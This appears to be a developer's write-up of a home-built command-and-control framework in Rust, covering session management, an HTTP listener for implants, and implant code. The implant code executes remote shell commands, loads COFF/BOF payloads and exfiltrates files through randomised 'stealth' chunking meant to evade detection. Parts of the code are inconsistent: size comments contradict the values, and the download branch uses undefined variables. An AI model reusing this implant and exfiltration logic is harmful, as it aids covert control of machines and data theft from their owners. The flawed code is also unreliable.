## HTTP Session

The `HttpSession` struct encapsulates all the data and runtime state associated with an active HTTP-based session between an implant and the server.

- Manage session metadata such as unique identifiers, connection state, last check-in time, and implant information (e.g., hostname, user, OS).

- Store and manage queued commands awaiting delivery to the implant.

- Handle responses received from the implant and dispatch them.

- Track and modify the session mode, such as interactive shell, file transfer, or idle, allowing higher-level components (like the CLI or network service) to adapt behavior dynamically.

The `HttpSession` acts as an abstraction layer between the network layer and the session management.
Network services in this case the http handler interact directly with this struct to:

- Activate or deactivate a session.

- Send queued commands to the implant.

- Process incoming data or file chunks.

- Update the internal state and emit relevant events.

### HTTP listener handler

The HTTP Listener Handler serves as the network-facing component responsible for managing inbound and outbound communication between the server and HTTP-based implants.

This component is implemented using Axum for request routing and asynchronous handling, ensuring scalability and efficient concurrency under high connection volumes.
Data exchanged between the server and implants is serialized and deserialized using Serde, allowing consistent and type-safe encoding of messages such as:

`UniversalCommandRequest` — encapsulates commands sent from the server to implants.

`UniversalCommandResponse` — represents responses or task results received from implants.

Transfer-related request and response types — handle file upload/download operations in chunked form.

Session Registration:
Process new implant check-ins, register or reactivate sessions in the SessionManager, and return configuration or task data.

Command Dispatching:
Retrieve queued commands from the session’s internal queue and serialize them as outbound responses to implants.

Response Handling:
Deserialize incoming implant responses and route them to the appropriate session queue, updating session state and emitting notifications for the CLI or scripting engine.

Transfer Management:
Delegate upload/download operations to the TransferManager, including initiation (handle_start), chunk handling (handle_chunk), and completion (handle_complete).

Error Handling & Validation:
Perform request validation, error mapping, and structured logging to maintain reliability and observability across all HTTP interactions.

Integration

The HTTP Listener Handler integrates closely with:

`MultiProtocolSessionManager` — for session state lookup, registration, and response queuing.

`TransferManager` — for handling data streams and file transfers.

`Scripting Engine` — for dynamically generated tasks and custom command execution.

This component is responsible for defining and initializing the HTTP endpoints used for communication between the server and implants.
It leverages Axum’s routing system to define REST-like handlers for various operations such as registration, polling, command retrieval, and data transfer.

At startup, the listener creates a predefined set of routes for core functionality (e.g., /register, /poll, /checkin).
In future versions, the system will allow users to define their own endpoints and HTTP methods, providing flexibility for custom protocols or stealthier communication profiles.

The listener integrates `graceful shutdown support`, ensuring that when the server is stopped, all active requests are completed before termination.
This prevents abrupt disconnections and ensures clean state transitions for ongoing transfers and session updates.

Currently, the registration process does not implement authentication or verification of incoming clients.
This means that any implant can register with the server without prior validation.
Future improvements will introduce authentication mechanisms, such as cryptographic tokens, certificate pinning, or session signing, to ensure that only legitimate implants can establish communication channels.

Depending on the session mode, the HTTP listener adapts its polling.

- `Session Mode` (Long Polling):
In this mode, the server holds the incoming request open until a new task becomes available or a deadline is reached.
This technique reduces unnecessary network traffic while ensuring near-real-time task delivery to active sessions.
It’s particularly useful for interactive sessions where immediate command execution is required.

- `Beacon Mode` (Short Polling):
In beacon mode, the implant periodically sends short-lived requests without waiting for the server’s response to deliver new tasks.
This approach mimics beacon-based C2 behavior, reducing the visibility of continuous open connections and providing more control over the timing of communications.

- `Hybrid Mode` (Long Polling)
This is an implant in beacon mode with its various timing in connection but once is made, it holds the request.

For handling results I created an enum. This approach provides a clean and extensible structure, allowing new result variants to be added later without disrupting existing logic.

By using an enum, we can represent multiple possible outcomes under a single unified type, improving type safety, readability, and future scalability.
```rust
pub enum Results {
    Result(ResultPayload),
    TransferMessage(TransferMessage)
}
```

When a response is received, it’s wrapped in a `Result` enum, which is then matched to determine the appropriate handling logic.
If the variant represents a standard command result, the response is pushed into the session’s response queue, and all relevant subscribers are notified of the new data arrival.

For file transfer operations, the system matches against a specialized TransferMessage enum, which distinguishes between different transfer states:
`Start`, `Chunk`, and `Complete`.
Each variant is delegated to the `TransferManager`, which is responsible for managing file creation, chunk writing, and finalization once the transfer completes.

To minimise binary size you usually trade convenience for platform specificity. Cross-compilation and careful selection of the runtime are the first levers: choosing whether to link the full std or to favour core/alloc/no_std affects both size and portability. Small, focused agents tend to avoid heavyweight third-party crates that pull in large dependency graphs; instead they call platform APIs directly and only include the minimal runtime features required.

This often means adopting a lower-level programming style: writing thin, OS-specific code, limiting abstractions, and favouring compact representations. For operations where standard library conveniences would bloat the binary, teams typically replace them with lightweight, platform-native implementations. In extreme size-constrained scenarios, developers may also use lower-level languages or inline assembly for tiny bootstrap code, but that increases complexity and maintenance cost.

The result is a smaller, more tightly controlled artifact, at the expense of portability, developer ergonomics, and maintainability — so this tradeoff should be made deliberately and only when the operational requirements justify it. So you can directly create implant in c or in Rust in a very C-ish way.

When a request is received, the handler matches the requested operation and dispatches accordingly:
- `exec` — Executes the specified command via the system shell (for example, cmd.exe /c on Windows), capturing and returning the command output.

- `coff` — Invokes the COFF loader: it loads and runs the provided COFF payload, collects the result data placed into a global buffer by the BOF (or loader), and returns that result. The COFF loader’s internals are implemented separately and described elsewhere.

- `download` — The most interesting case: the implant uses a generic send_loop that expects a send_chunk function and associated arguments. By supplying a closure as send_chunk, the implementation can capture additional context (for example, file handles, session state, or transport-specific parameters). This closure-based design keeps send_loop transport-agnostic — different transports can provide their own send_chunk closures with protocol-specific behavior while reusing the same high-level loop.
```rust 
fn handle_command(client: &Client, headers: &HeaderMap, state: &mut AgentState<'_>, cmd: UniversalCommandRequest) -> Result<(), Box<dyn std::error::Error>> {
    match cmd.command_type.as_str() {
        // Execute a command non-interactively
        "exec" => {
            let cmdline = cmd.metadata.iter().find(|m| m.key == "cmd").map(|m| String::from_utf8_lossy(&m.value).to_string())
                .or_else(|| cmd.payload.as_ref().and_then(|p| String::from_utf8(p.clone()).ok()))
                .unwrap_or_else(|| String::from(""));
            let (success, out, err) = exec_once(&state.current_dir, &cmdline)?;
            let meta = HashMap::new();
            if !err.is_empty() { send_result(client, headers, state, cmd.id, success, Some(err),  HashMap::new())?; }
            send_result(client, headers, state, cmd.id, success, out,  meta)?;
        }
        "coff" => {
            match cmd.payload {
                Some(bytes) => {
                    let entry = unsafe { cmd.metadata.iter().find(|m| m.key == "entry").map(|m| String::from_utf8_unchecked(m.value.clone()) ).unwrap_unchecked() };
                    let args_opt = cmd.metadata.iter().find(|m| m.key == "args").map(|m| m.value.clone());
                    // Keep buffer alive while loader operates by holding it in scope
                    let coff_bytes = bytes;
                    let mut loader = CoffObject::new_with_len(coff_bytes.as_ptr(), coff_bytes.len());
                    let res = match args_opt {
                        Some(s) => { 
                            loader.try_execute_entry_point_with_args(&entry, Some(&s))
                        },
                        None => loader.try_execute_entry_point_with_args(&entry, None),
                    };
                    let success = match res {
                        Ok(_) => true,
                        Err(_) =>false
                    };
                    #[allow(static_mut_refs)]
                    let output = unsafe { core::mem::take(&mut GLOBAL_BUFFER)};
                    // Acknowledge completion with success flag
                    send_result(client, headers, state, cmd.id, success, Some(output),  HashMap::new())?;
                }
                None => {
                    send_result(client, headers, state, cmd.id, false, Some("missing payload".as_bytes().to_vec()), HashMap::new())?;
                }
            }
        }
         "download" => {
                /*Some logic to verify file*/
                let send_chunk = move |transfer_id: u16, offset: u64, data: *const u8, size: usize| {
                let state_c = state_c.clone();
                async move{
                   let result = send_transfer_chunk(client, headers, state_c, transfer_id, offset, data, size);
                   result
                }
                };
                let _ = send_loop(path.as_path(),StealthProfile::Aggressive,transfer_id,send_chunk);
                let _ = send_complete_transfer(client, headers, state, transfer_id)?;
        }
    }
}
```

Now let's start with the download function we've already seen the transfer manager and how it works in the server side, now how this in sent from the implant to the client?

### Download

The send loop accepts a function implementation and instantiates a `ChunkSampler` to control how payloads are split and paced. `ChunkSampler` encapsulates a transmission profile that can introduce variability in chunk sizes, periodic bursts, and pauses between bursts. Internally it uses an RNG to choose each chunk’s size according to the configured profile and a “burst”

```rust
pub struct ChunkSampler {
    rng: SmallRng,
    burst_next_threshold: u8,
    burst_counter: u8,
    profile: StealthProfile,
}
impl ChunkSampler{
 #[inline]
    pub fn sample_chunk_size(&mut self) -> usize {
        let p: f64 = self.rng.random();
        if p < 0.60 {
            // main band: 10 KiBs - 64 KiBs
            self.rng.random_range(100 * 1024..=150 * 1024)
        } else if p < 0.90 {
            // small: 2KiBs - 10KiBs
            self.rng.random_range(30 * 1024..=64 * 1024)
        } else {
            // occasional large: 6KiB - 64KiBs
            self.rng.random_range(150 * 1024..= 200 * 1024)
        }
    }

    #[inline]
    pub const fn max_chunk_size() -> usize {
       200 * 1024
    }
}
pub fn send_loop<F>( file_path: &Path,profile: StealthProfile, transfer_id: u16, send_chunk: F) 
-> Result<(), String> where F: Fn(u16, u64, *const u8, usize) -> Result<bool, bool> {

    let mut sampler = ChunkSampler::new(profile);
    let mut file = File::open(file_path).expect("Error opening file");
    let mut offset: u64 = 0;
    let mut buf = vec![0u8; ChunkSampler::max_chunk_size()]; 

    loop {
        let chunk_size = sampler.sample_chunk_size();
        let n = file.read(&mut buf[..chunk_size]).expect("Error reading file");
        if n == 0 { break; }
        send_chunk(transfer_id, offset, buf[..n].as_ptr(), n ).expect("Error sending chunk");
        offset += n as u64;

        if let Some(long_pause) = sampler.maybe_long_pause() {
            sleep(long_pause)?;
        } else {
            let d = sampler.sample_inter_chunk_delay();
            sleep(d)?;
        }
    }
    Ok(())
}
```
